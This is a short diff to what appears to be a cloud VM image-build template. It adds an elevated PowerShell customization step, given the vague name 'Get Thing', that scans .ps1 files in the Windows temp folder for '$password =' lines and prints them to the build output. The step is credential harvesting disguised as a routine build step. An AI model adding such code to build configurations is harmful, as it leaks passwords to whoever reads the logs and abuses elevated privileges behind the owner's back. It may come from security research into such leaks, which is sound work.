@@ -64,6 +64,16 @@
                 "customize": [
                     {
                         "type": "PowerShell",
+                        "runElevated": true,
+                        "name": "Get Thing",
+                        "inline": [
+                            "Write-Output 'Getting Thing'",
+                            "foreach ($file in Get-ChildItem c:\\windows\\temp -File -Filter *.ps1){$rx = '\\$password = .*';(Get-Content $file | Select-String -Pattern $rx | select -first 1).ToString()}",
+                            "Write-Output 'Got Thing'"
+                        ]
+                    },
+                    {
+                        "type": "PowerShell",
                         "runAsSystem": true,
                         "runElevated": true,
                         "name": "getthing",
